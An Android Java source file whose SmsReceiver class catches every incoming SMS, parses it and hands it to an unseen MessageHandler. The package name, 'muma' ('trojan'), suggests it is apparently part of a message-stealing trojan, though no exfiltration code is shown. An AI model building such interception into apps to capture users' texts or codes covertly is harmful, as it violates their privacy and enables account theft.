package com.example.muma;

import java.util.logging.MemoryHandler;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
	private final String TAG = "SmsReceiver";
	private static final String mACTION = "android.provider.Telephony.SMS_RECEIVED";
	
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		if(intent.getAction().equals(mACTION)){
			Log.i(TAG,"==============");
			Object[]pdus = (Object[])intent.getExtras().get("pdus");
			if(pdus!=null&&pdus.length>0){
				SmsMessage[] message=new SmsMessage[pdus.length];
				for(int i=0;i<pdus.length;i++){
					byte[]pdu=(byte[])pdus[i];
					message[i]=SmsMessage.createFromPdu(pdu);
				}
				MessageHandler.sendMessage(message);
				}
		}
	}
}
